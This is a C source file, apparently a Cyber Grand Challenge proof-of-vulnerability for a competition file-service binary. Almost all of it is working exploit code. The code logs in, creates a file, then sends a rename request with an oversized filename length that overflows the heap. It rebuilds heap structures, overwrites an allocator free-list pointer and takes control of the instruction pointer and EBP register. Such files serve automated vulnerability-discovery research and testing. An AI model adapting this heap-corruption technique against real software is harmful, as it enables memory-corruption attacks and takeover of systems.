/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libcgc.h"

#define EBP (5)

unsigned int cgc_ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int cgc_SendBytes(int fd, char *buf, unsigned int len) {
	cgc_size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (cgc_transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int cgc_pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

unsigned int cgc_SendString(int fd, char *buf) {
	unsigned int len = 0;

	return(cgc_SendBytes(fd, buf, cgc_pov_strlen(buf)));
}

void cgc_NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) {
	unsigned int PovType = 1;

	// Request Type 1 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the ipmask
	if (cgc_SendBytes(3, (char *)&ipmask, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the regmask
	if (cgc_SendBytes(3, (char *)&regmask, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the register number we'll be controlling
	if (cgc_SendBytes(3, (char *)&regnum, 4) != 4) {
		cgc__terminate(-1);
	}

	// get the 4-byte value for eip
	if (cgc_ReadBytes(3, (char *)type1_ip, 4) != 4) {
		cgc__terminate(-1);
	} 
	// get the 4-byte value for the register
	if (cgc_ReadBytes(3, (char *)type1_reg, 4) != 4) {
		cgc__terminate(-1);
	}

	return;

}

#define CFS_LOGIN ("\x00")
#define CFS_WRITE ("\x03")
#define CFS_RENAME ("\x06")
#define RESP_SUCCESS ("\x00")
int main(int cgc_argc, char *cgc_argv[]) {
	unsigned int type1_ip;
	unsigned int type1_reg;
	char buf[10];
	unsigned int i;

	// negotiate a Type1 POV with the Competition Framework
	// we will control eip and ebp
	cgc_NegotiateType1Pov(0x00fefefe, 0xfefefefe, EBP, &type1_ip, &type1_reg);
	// deal with 0x00 interferes with this CB's POV
	// also we don't set the last byte of ip
	type1_ip  |= 0xff010101;
	type1_reg |= 0x01010101;

	//
	// login
	//
	cgc_SendBytes(STDOUT, CFS_LOGIN, 1);
	cgc_SendBytes(STDOUT, "\x04", 1); // Username Length
	cgc_SendBytes(STDOUT, "\x0a", 1); // Password Length
	cgc_SendString(STDOUT, "root");   // Username
	cgc_SendString(STDOUT, "rootpasswd");   // Password
	cgc_ReadBytes(STDIN, buf, 4);
	if (buf[0] != '\x00' || buf[1] != '\x00') {
		// failure
		cgc_transmit(STDERR, "login failed\n", 13, 0);
		return(-1);
	}

	//
	// create a file 'test1234'
	//
	cgc_SendBytes(STDOUT, CFS_WRITE, 1);
	//SendBytes(STDOUT, "\x03\x00", 2); // file content length
	cgc_SendBytes(STDOUT, "\x14", 1); // file content length
	cgc_SendBytes(STDOUT, "\x08", 1); // Filename length
	cgc_SendString(STDOUT, "test1234");   // Filename
	cgc_SendString(STDOUT, "AAAAAAAAAAAAAAAAAAAA");    // File Contents
	cgc_ReadBytes(STDIN, buf, 4);
	if (buf[0] != '\x03' || buf[1] != '\x00') {
		// failure
		cgc_transmit(STDERR, "write failed\n", 14, 0);
		return(-1);
	}

	//
	// rename test1234 and trigger the vulnerability
	//
	cgc_SendBytes(STDOUT, CFS_RENAME, 1);
	cgc_SendBytes(STDOUT, "\xff", 1); // OldFilename length (trigger the exploit)
	cgc_SendBytes(STDOUT, "\x07", 1); // NewFilename length

        // Old filename starting at 0xb7fff12c
	cgc_SendBytes(STDOUT, "test1234", 8);
	// overwrite some unimportant heap data
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00", 4);
	// overwrite lookaside next pointer for the free block at 0xb7fff150
	cgc_SendBytes(STDOUT, "\x40\xaf\xaa\xba", 4);
	// overwrite some more unimportant heap data
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00", 4);
	// re-create the test file name at 0xb7fff1b4-4
	cgc_SendBytes(STDOUT, "\x10\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "test1234", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	// recreate the passwd file data at 0xb7fff1c8-4
	cgc_SendBytes(STDOUT, "\x20\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "root:rootpasswd\nuser:AAAAAAAAAA\x00", 32);
	// recreate the request struct at 0xb7fff1ec-4
	cgc_SendBytes(STDOUT, "\x28\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "\x06\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x2c\xf1\xff\xb7", 4);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	cgc_SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
	// partially recreate the Test1234 file inode struct at 0xb7fff218-4
	cgc_SendBytes(STDOUT, "\x18\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "\xb4\xf1\xff\xb7", 4);
	cgc_SendBytes(STDOUT, "\x44\xf1\xff\xb7", 4);
	cgc_SendBytes(STDOUT, "\x06\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "\x14\x00\x00\x00", 4);
	cgc_SendBytes(STDOUT, "\x34\x2f\xff", 3);

	// Send the NewFilename
	cgc_SendBytes(STDOUT, (char *)&type1_reg, 4);
	cgc_SendBytes(STDOUT, (char *)&type1_ip, 3);

	return(0);
}
